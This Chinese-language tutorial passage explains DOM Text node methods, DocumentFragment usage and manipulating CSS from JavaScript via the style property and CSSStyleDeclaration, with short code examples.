<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;p&gt;Hello World&lt;/p&gt;</span></span><br><span class="line"><span class="keyword">var</span> pElementText = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;p&#x27;</span>).<span class="property">firstChild</span>;</span><br><span class="line"></span><br><span class="line">pElementText.<span class="title function_">appendData</span>(<span class="string">&#x27;!&#x27;</span>);</span><br><span class="line"><span class="comment">// 页面显示 Hello World!</span></span><br><span class="line">pElementText.<span class="title function_">deleteData</span>(<span class="number">7</span>, <span class="number">5</span>);</span><br><span class="line"><span class="comment">// 页面显示 Hello W</span></span><br><span class="line">pElementText.<span class="title function_">insertData</span>(<span class="number">7</span>, <span class="string">&#x27;Hello &#x27;</span>);</span><br><span class="line"><span class="comment">// 页面显示 Hello WHello</span></span><br><span class="line">pElementText.<span class="title function_">replaceData</span>(<span class="number">7</span>, <span class="number">5</span>, <span class="string">&#x27;World&#x27;</span>);</span><br><span class="line"><span class="comment">// 页面显示 Hello WWorld</span></span><br><span class="line">pElementText.<span class="title function_">substringData</span>(<span class="number">7</span>, <span class="number">10</span>);</span><br><span class="line"><span class="comment">// 页面显示不变，返回&quot;World &quot;</span></span><br></pre></td></tr></table></figure>



<h4 id="3-2-remove-移除Text节点"><a href="#3-2-remove-移除Text节点" class="headerlink" title="3.2 remove() 移除Text节点"></a>3.2 remove() 移除Text节点</h4><p><code>remove</code>方法用于移除当前<code>Text</code>节点。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;p&gt;Hello World&lt;/p&gt;</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;p&#x27;</span>).<span class="property">firstChild</span>.<span class="title function_">remove</span>()</span><br><span class="line"><span class="comment">// 现在 HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;p&gt;&lt;/p&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="3-3-splitText-分割Text节点变为两个"><a href="#3-3-splitText-分割Text节点变为两个" class="headerlink" title="3.3 splitText() 分割Text节点变为两个"></a>3.3 splitText() 分割Text节点变为两个</h4><p><code>splitText</code>方法<strong>将<code>Text</code>节点一分为二，变成两个毗邻的<code>Text</code>节点。它的参数就是分割位置（从零开始）</strong>，分割到该位置的字符前结束。如果分割位置不存在，将报错。</p>
<p>分割后，该方法<strong>返回分割位置后方的字符串</strong>，而原<code>Text</code>节点变成只包含分割位置前方的字符串。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// html 代码为 &lt;p id=&quot;p&quot;&gt;foobar&lt;/p&gt;</span></span><br><span class="line"><span class="keyword">var</span> p = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> textnode = p.<span class="property">firstChild</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> newText = textnode.<span class="title function_">splitText</span>(<span class="number">3</span>);</span><br><span class="line">newText <span class="comment">// &quot;bar&quot;</span></span><br><span class="line">textnode <span class="comment">// &quot;foo&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>父元素节点的<code>normalize</code>方法可以将毗邻的两个<code>Text</code>节点合并。</strong></p>
<p>接上面的例子，文本节点的<code>splitText</code>方法将一个<code>Text</code>节点分割成两个，父元素的<code>normalize</code>方法可以实现逆操作，将它们合并。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p.<span class="property">childNodes</span>.<span class="property">length</span> <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将毗邻的两个 Text 节点合并</span></span><br><span class="line">p.<span class="title function_">normalize</span>();</span><br><span class="line">p.<span class="property">childNodes</span>.<span class="property">length</span> <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>



<h3 id="4、DocumentFragment-文档片段节点"><a href="#4、DocumentFragment-文档片段节点" class="headerlink" title="4、DocumentFragment 文档片段节点"></a>4、DocumentFragment 文档片段节点</h3><p><code>DocumentFragment</code>节点代表一个<strong>文档的片段，本身就是一个完整的 DOM 树形结构。它没有父节点</strong>，<code>parentNode</code>返回<code>null</code>，但是<strong>可以插入任意数量的子节点。它不属于当前文档，操作<code>DocumentFragment</code>节点，要比直接操作 DOM 树快得多。</strong></p>
<p>它一般用于构建一个 DOM 结构，然后插入当前文档。<code>document.createDocumentFragment</code>方法，以及浏览器原生的<code>DocumentFragment</code>构造函数，可以创建一个空的<code>DocumentFragment</code>节点。然后再使用其他 DOM 方法，向其添加子节点。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> docFrag = <span class="variable language_">document</span>.<span class="title function_">createDocumentFragment</span>();</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">var</span> docFrag = <span class="keyword">new</span> <span class="title class_">DocumentFragment</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> li = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;li&#x27;</span>);</span><br><span class="line">li.<span class="property">textContent</span> = <span class="string">&#x27;Hello World&#x27;</span>;</span><br><span class="line">docFrag.<span class="title function_">appendChild</span>(li);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;ul&#x27;</span>).<span class="title function_">appendChild</span>(docFrag);</span><br></pre></td></tr></table></figure>

<p>上面代码创建了一个<code>DocumentFragment</code>节点，然后将一个<code>li</code>节点添加在它里面，最后将<code>DocumentFragment</code>节点移动到原文档。</p>
<p><strong>注意</strong>，<code>DocumentFragment</code><strong>节点本身不能被插入当前文档</strong>。当它作为<code>appendChild()</code>、<code>insertBefore()</code>、<code>replaceChild()</code>等方法的参数时，是它的<strong>所有子节点插入当前文档，而不是它自身</strong>。一旦<code>DocumentFragment</code>节点被添加进当前文档，它自身就变成了空节点（<code>textContent</code>属性为空字符串），可以被再次使用。如果想要保存<code>DocumentFragment</code>节点的内容，可以使用<code>cloneNode</code>方法。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span></span><br><span class="line">  .<span class="title function_">querySelector</span>(<span class="string">&#x27;ul&#x27;</span>)</span><br><span class="line">  .<span class="title function_">appendChild</span>(docFrag.<span class="title function_">cloneNode</span>(<span class="literal">true</span>));</span><br></pre></td></tr></table></figure>

<p>上面这样添加<code>DocumentFragment</code>节点进入当前文档，不会清空<code>DocumentFragment</code>节点。</p>
<p>下面是一个例子，使用<code>DocumentFragment</code>反转一个指定节点的所有子节点的顺序。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">reverse</span>(<span class="params">n</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> f = <span class="variable language_">document</span>.<span class="title function_">createDocumentFragment</span>();</span><br><span class="line">  <span class="keyword">while</span>(n.<span class="property">lastChild</span>) f.<span class="title function_">appendChild</span>(n.<span class="property">lastChild</span>);</span><br><span class="line">  n.<span class="title function_">appendChild</span>(f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>DocumentFragment</code>节点对象<strong>没有自己的属性和方法，全部继承自<code>Node</code>节点和<code>ParentNode</code>接口</strong>。也就是说，<code>DocumentFragment</code>节点比<code>Node</code>节点多出以下四个属性。</p>
<ul>
<li><code>children</code>：返回一个动态的<code>HTMLCollection</code>集合对象，包括当前<code>DocumentFragment</code>对象的所有子元素节点。</li>
<li><code>firstElementChild</code>：返回当前<code>DocumentFragment</code>对象的第一个子元素节点，如果没有则返回<code>null</code>。</li>
<li><code>lastElementChild</code>：返回当前<code>DocumentFragment</code>对象的最后一个子元素节点，如果没有则返回<code>null</code>。</li>
<li><code>childElementCount</code>：返回当前<code>DocumentFragment</code>对象的所有子元素数量。</li>
</ul>
<h2 id="八、CSS-操作"><a href="#八、CSS-操作" class="headerlink" title="八、CSS 操作"></a>八、CSS 操作</h2><p> CSS 与 JavaScript 是两个有着明确分工的领域，前者负责页面的视觉效果，后者负责与用户的行为互动。但是，它们毕竟同属网页开发的前端，因此不可避免有着交叉和互相配合。本章介绍如何<strong>通过 JavaScript 操作 CSS</strong>。 </p>
<h3 id="1、HTML-元素的-style-属性"><a href="#1、HTML-元素的-style-属性" class="headerlink" title="1、HTML 元素的 style 属性"></a>1、HTML 元素的 style 属性</h3><p>操作 CSS 样式最简单的方法，就是使用网页元素节点的<code>getAttribute()</code>方法、<code>setAttribute()</code>方法和<code>removeAttribute()</code>方法，直接读写或删除网页元素的<code>style</code>属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">div.<span class="title function_">setAttribute</span>(</span><br><span class="line">  <span class="string">&#x27;style&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;background-color:red;&#x27;</span> + <span class="string">&#x27;border:1px solid black;&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>上面的代码相当于下面的 HTML 代码。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=<span class="string">&quot;background-color:red; border:1px solid black;&quot;</span> /&gt;</span><br></pre></td></tr></table></figure>

<p><strong><code>style</code>不仅可以使用字符串读写，它本身还是一个对象</strong>，部署了 CSSStyleDeclaration 接口（详见下面的介绍），<strong>可以直接读写个别属性</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.<span class="property">style</span>.<span class="property">fontSize</span> = <span class="string">&#x27;18px&#x27;</span>;</span><br><span class="line">e.<span class="property">style</span>.<span class="property">color</span> = <span class="string">&#x27;black&#x27;</span>;</span><br></pre></td></tr></table></figure>



<h3 id="2、CSSStyleDeclaration-接口"><a href="#2、CSSStyleDeclaration-接口" class="headerlink" title="2、CSSStyleDeclaration 接口"></a>2、CSSStyleDeclaration 接口</h3><h4 id="2-1-简介-用来操作元素的样式，可读写"><a href="#2-1-简介-用来操作元素的样式，可读写" class="headerlink" title="2.1 简介 - 用来操作元素的样式，可读写"></a>2.1 简介 - 用来操作元素的样式，可读写</h4><p>CSSStyleDeclaration 接口<strong>用来操作元素的样式</strong>。三个地方部署了这个接口。</p>
<ul>
<li>元素节点的<code>style</code>属性（<code>Element.style</code>）</li>
<li><code>CSSStyle</code>实例的<code>style</code>属性</li>
<li><code>window.getComputedStyle()</code>的返回值</li>
</ul>
<p>CSSStyleDeclaration 接口<strong>可以直接读写 CSS 的样式属性</strong>，不过，连词号需要变成骆驼拼写法。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> divStyle = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;div&#x27;</span>).<span class="property">style</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可读写</span></span><br><span class="line">divStyle.<span class="property">backgroundColor</span> = <span class="string">&#x27;red&#x27;</span>;</span><br><span class="line">divStyle.<span class="property">border</span> = <span class="string">&#x27;1px solid black&#x27;</span>;</span><br><span class="line">divStyle.<span class="property">width</span> = <span class="string">&#x27;100px&#x27;</span>;</span><br><span class="line">divStyle.<span class="property">height</span> = <span class="string">&#x27;100px&#x27;</span>;</span><br><span class="line">divStyle.<span class="property">fontSize</span> = <span class="string">&#x27;10em&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意，读的样式只是行内样式，不能读取样式表的样式</span></span><br><span class="line">divStyle.<span class="property">backgroundColor</span> <span class="comment">// red</span></span><br><span class="line">divStyle.<span class="property">border</span> <span class="comment">// 1px solid black</span></span><br><span class="line">divStyle.<span class="property">height</span> <span class="comment">// 100px</span></span><br><span class="line">divStyle.<span class="property">width</span> <span class="comment">// 100px</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>style</code>属性的值是一个 CSSStyleDeclaration 实例。<strong>这个对象所包含的属性与 CSS 规则一一对应</strong>，但是名字需要改写，比如<code>background-color</code>写成<code>backgroundColor</code>。改写的规则是将横杠从 CSS 属性名中去除，然后将横杠后的第一个字母大写。如果 CSS 属性名是 JavaScript 保留字，则规则名之前需要加上字符串<code>css</code>，比如**<code>float</code>写成<code>cssFloat</code>**。</p>
<p><strong>改写规则：烤串变驼峰，保留字前加<code>css</code></strong></p>
<p>注意，该对象的属性值都是字符串，设置时必须包括单位，但是不含规则结尾的分号。比如，<code>divStyle.width</code>不能写为<code>100</code>，而要写为<code>100px</code>。</p>
<p>另外，**<code>Element.style</code>返回的只是行内样式，并不是该元素的全部样式<strong>。通过样式表设置的样式，或者从父元素继承的样式，无法通过这个属性得到。</strong>元素的全部样式要通过<code>window.getComputedStyle()</code>得到。**</p>
<h4 id="2-2-CSSStyleDeclaration-实例属性"><a href="#2-2-CSSStyleDeclaration-实例属性" class="headerlink" title="2.2 CSSStyleDeclaration 实例属性"></a>2.2 CSSStyleDeclaration 实例属性</h4><h5 id="（1）CSSStyleDeclaration-cssText-用来读写所有行内样式"><a href="#（1）CSSStyleDeclaration-cssText-用来读写所有行内样式" class="headerlink" title="（1）CSSStyleDeclaration.cssText 用来读写所有行内样式"></a>（1）CSSStyleDeclaration.cssText 用来读写所有行内样式</h5><p><code>CSSStyleDeclaration.cssText</code>属性<strong>用来读写当前规则的所有样式声明文本</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> divStyle = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;div&#x27;</span>).<span class="property">style</span>;</span><br><span class="line"></span><br><span class="line">divStyle.<span class="property">cssText</span> = <span class="string">&#x27;background-color: red;&#x27;</span> <span class="comment">// 会覆盖原有的整个行内样式</span></span><br><span class="line">  + <span class="string">&#x27;border: 1px solid black;&#x27;</span></span><br><span class="line">  + <span class="string">&#x27;height: 100px;&#x27;</span></span><br><span class="line">  + <span class="string">&#x27;width: 100px;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>注意，<code>cssText</code>的属性值不用改写 CSS 属性名。</p>
<p><strong>删除一个元素的所有行内样式，最简便的方法就是设置<code>cssText</code>为空字符串。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">divStyle.<span class="property">cssText</span> = <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure>



<h5 id="（2）CSSStyleDeclaration-length-行内样式的长度"><a href="#（2）CSSStyleDeclaration-length-行内样式的长度" class="headerlink" title="（2）CSSStyleDeclaration.length 行内样式的长度"></a>（2）CSSStyleDeclaration.length 行内样式的长度</h5><p><code>CSSStyleDeclaration.length</code>属性<strong>返回一个整数值，表示当前规则包含多少条样式声明。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;myDiv&quot;</span></span><br><span class="line"><span class="comment">//   style=&quot;height: 1px;width: 100%;background-color: #CA1;&quot;</span></span><br><span class="line"><span class="comment">// &gt;&lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> myDiv = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myDiv&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> divStyle = myDiv.<span class="property">style</span>;</span><br><span class="line">divStyle.<span class="property">length</span> <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>myDiv</code>元素的行内样式共包含3条样式规则。</p>
<h5 id="（3）CSSStyleDeclaration-parentRule-返回当前规则所属的那个样式块"><a href="#（3）CSSStyleDeclaration-parentRule-返回当前规则所属的那个样式块" class="headerlink" title="（3）CSSStyleDeclaration.parentRule 返回当前规则所属的那个样式块"></a>（3）CSSStyleDeclaration.parentRule 返回当前规则所属的那个样式块</h5><p><code>CSSStyleDeclaration.parentRule</code>属性<strong>返回当前规则所属的那个样式块</strong>（CSSRule 实例）。如果不存在所属的样式块，该属性返回<code>null</code>。</p>
<p>该属性只读，且只在使用 CSSRule 接口时有意义。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> declaration = <span class="variable language_">document</span>.<span class="property">styleSheets</span>[<span class="number">0</span>].<span class="property">rules</span>[<span class="number">0</span>].<span class="property">style</span>;</span><br><span class="line">declaration.<span class="property">parentRule</span> === <span class="variable language_">document</span>.<span class="property">styleSheets</span>[<span class="number">0</span>].<span class="property">rules</span>[<span class="number">0</span>]</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>



<h4 id="2-3-CSSStyleDeclaration-实例方法"><a href="#2-3-CSSStyleDeclaration-实例方法" class="headerlink" title="2.3 CSSStyleDeclaration 实例方法"></a>2.3 CSSStyleDeclaration 实例方法</h4><h5 id="（1）CSSStyleDeclaration-getPropertyPriority-指定样式有没有设置important优先级"><a href="#（1）CSSStyleDeclaration-getPropertyPriority-指定样式有没有设置important优先级" class="headerlink" title="（1）CSSStyleDeclaration.getPropertyPriority() 指定样式有没有设置important优先级"></a>（1）CSSStyleDeclaration.getPropertyPriority() 指定样式有没有设置important优先级</h5><p><code>CSSStyleDeclaration.getPropertyPriority</code>方法<strong>接受 CSS 样式的属性名作为参数，返回一个字符串，表示有没有设置<code>important</code>优先级。如果有就返回<code>important</code>，否则返回空字符串。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;myDiv&quot; style=&quot;margin: 10px!important; color: red;&quot;/&gt;</span></span><br><span class="line"><span class="keyword">var</span> style = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myDiv&#x27;</span>).<span class="property">style</span>;</span><br><span class="line">style.<span class="property">margin</span> <span class="comment">// &quot;10px&quot;</span></span><br><span class="line">style.<span class="title function_">getPropertyPriority</span>(<span class="string">&#x27;margin&#x27;</span>) <span class="comment">// &quot;important&quot;</span></span><br><span class="line">style.<span class="title function_">getPropertyPriority</span>(<span class="string">&#x27;color&#x27;</span>) <span class="comment">// &quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>margin</code>属性有<code>important</code>优先级，<code>color</code>属性没有。</p>
<h5 id="（2）CSSStyleDeclaration-getPropertyValue-返回指定样式的值"><a href="#（2）CSSStyleDeclaration-getPropertyValue-返回指定样式的值" class="headerlink" title="（2）CSSStyleDeclaration.getPropertyValue() 返回指定样式的值"></a>（2）CSSStyleDeclaration.getPropertyValue() 返回指定样式的值</h5><p><code>CSSStyleDeclaration.getPropertyValue</code>方法<strong>接受 CSS 样式属性名作为参数，返回一个字符串，表示该属性的属性值。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;myDiv&quot; style=&quot;margin: 10px!important; color: red;&quot;/&gt;</span></span><br><span class="line"><span class="keyword">var</span> style = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myDiv&#x27;</span>).<span class="property">style</span>;</span><br><span class="line">style.<span class="property">margin</span> <span class="comment">// &quot;10px&quot;</span></span><br><span class="line">style.<span class="title function_">getPropertyValue</span>(<span class="string">&quot;margin&quot;</span>) <span class="comment">// &quot;10px&quot;</span></span><br></pre></td></tr></table></figure>



<h5 id="（3）CSSStyleDeclaration-item-返回指定位置的CSS属性名"><a href="#（3）CSSStyleDeclaration-item-返回指定位置的CSS属性名" class="headerlink" title="（3）CSSStyleDeclaration.item() 返回指定位置的CSS属性名"></a>（3）CSSStyleDeclaration.item() 返回指定位置的CSS属性名</h5><p><code>CSSStyleDeclaration.item</code>方法<strong>接受一个整数值作为参数，返回该位置的 CSS 属性名</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;myDiv&quot; style=&quot;color: red; background-color: white;&quot;/&gt;</span></span><br><span class="line"><span class="keyword">var</span> style = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myDiv&#x27;</span>).<span class="property">style</span>;</span><br><span class="line">style.<span class="title function_">item</span>(<span class="number">0</span>) <span class="comment">// &quot;color&quot;</span></span><br><span class="line">style.<span class="title function_">item</span>(<span class="number">1</span>) <span class="comment">// &quot;background-color&quot;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>0</code>号位置的 CSS 属性名是<code>color</code>，<code>1</code>号位置的 CSS 属性名是<code>background-color</code>。</p>
<p>如果没有提供参数，这个方法会报错。如果参数值超过实际的属性数目，这个方法返回一个空字符值。</p>
<h5 id="（4）CSSStyleDeclaration-removeProperty-移除指定CSS属性，并返回原来的值"><a href="#（4）CSSStyleDeclaration-removeProperty-移除指定CSS属性，并返回原来的值" class="headerlink" title="（4）CSSStyleDeclaration.removeProperty() 移除指定CSS属性，并返回原来的值"></a>（4）CSSStyleDeclaration.removeProperty() 移除指定CSS属性，并返回原来的值</h5><p><code>CSSStyleDeclaration.removeProperty</code>方法<strong>接受一个属性名作为参数，在 CSS 规则里面移除这个属性，返回这个属性原来的值。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;myDiv&quot; style=&quot;color: red; background-color: white;&quot;&gt;</span></span><br><span class="line"><span class="comment">//   111</span></span><br><span class="line"><span class="comment">// &lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> style = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myDiv&#x27;</span>).<span class="property">style</span>;</span><br><span class="line">style.<span class="title function_">removeProperty</span>(<span class="string">&#x27;color&#x27;</span>) <span class="comment">// &#x27;red&#x27;</span></span><br><span class="line"><span class="comment">// HTML 代码变为</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;myDiv&quot; style=&quot;background-color: white;&quot;&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，删除<code>color</code>属性以后，字体颜色从红色变成默认颜色。</p>
<h5 id="（5）CSSStyleDeclaration-setProperty-设置新的-CSS-属性"><a href="#（5）CSSStyleDeclaration-setProperty-设置新的-CSS-属性" class="headerlink" title="（5）CSSStyleDeclaration.setProperty() 设置新的 CSS 属性"></a>（5）CSSStyleDeclaration.setProperty() 设置新的 CSS 属性</h5><p><code>CSSStyleDeclaration.setProperty</code>方法用来<strong>设置新的 CSS 属性</strong>。该方法没有返回值。</p>
<p>该方法可以接受三个参数。</p>
<ul>
<li>第一个参数：属性名，该参数是必需的。</li>
<li>第二个参数：属性值，该参数可选。如果省略，则参数值默认为空字符串。</li>
<li>第三个参数：优先级，该参数可选。如果设置，唯一的合法值是<code>important</code>，表示 CSS 规则里面的<code>!important</code>。</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;myDiv&quot; style=&quot;color: red; background-color: white;&quot;&gt;</span></span><br><span class="line"><span class="comment">//   111</span></span><br><span class="line"><span class="comment">// &lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> style = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myDiv&#x27;</span>).<span class="property">style</span>;</span><br><span class="line">style.<span class="title function_">setProperty</span>(<span class="string">&#x27;border&#x27;</span>, <span class="string">&#x27;1px solid blue&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码执行后，<code>myDiv</code>元素就会出现蓝色的边框。</p>
<h3 id="3、CSS-模块的侦测（判断浏览器是否支持某个样式）"><a href="#3、CSS-模块的侦测（判断浏览器是否支持某个样式）" class="headerlink" title="3、CSS 模块的侦测（判断浏览器是否支持某个样式）"></a>3、CSS 模块的侦测（判断浏览器是否支持某个样式）</h3><p>CSS 的规格发展太快，新的模块层出不穷。不同浏览器的不同版本，对 CSS 模块的支持情况都不一样。有时候，<strong>需要知道当前浏览器是否支持某个模块，这就叫做“CSS模块的侦测”。</strong></p>
<p><strong>判断浏览器是否支持某个样式</strong></p>
<p>一个比较普遍适用的方法是，判断元素的<code>style</code>对象的某个属性值是否为字符串。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typeof</span> element.<span class="property">style</span>.<span class="property">animationName</span> === <span class="string">&#x27;string&#x27;</span>;</span><br><span class="line"><span class="keyword">typeof</span> element.<span class="property">style</span>.<span class="property">transform</span> === <span class="string">&#x27;string&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>如果该 CSS 属性确实存在，会返回一个字符串。即使该属性实际上并未设置，也会返回一个空字符串。如果该属性不存在，则会返回<code>undefined</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">style</span>[<span class="string">&#x27;maxWidth&#x27;</span>] <span class="comment">// &quot;&quot;</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">style</span>[<span class="string">&#x27;maximumWidth&#x27;</span>] <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>

<p>上面代码说明，这个浏览器支持<code>max-width</code>属性，但是不支持<code>maximum-width</code>属性。</p>
<p>注意，不管 CSS 属性名的写法带不带连词线，<code>style</code>属性上都能反映出该属性是否存在。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">style</span>[<span class="string">&#x27;backgroundColor&#x27;</span>] <span class="comment">// &quot;&quot;</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">style</span>[<span class="string">&#x27;background-color&#x27;</span>] <span class="comment">// &quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>另外，使用的时候，需要把不同浏览器的 CSS 前缀也考虑进去。</p>
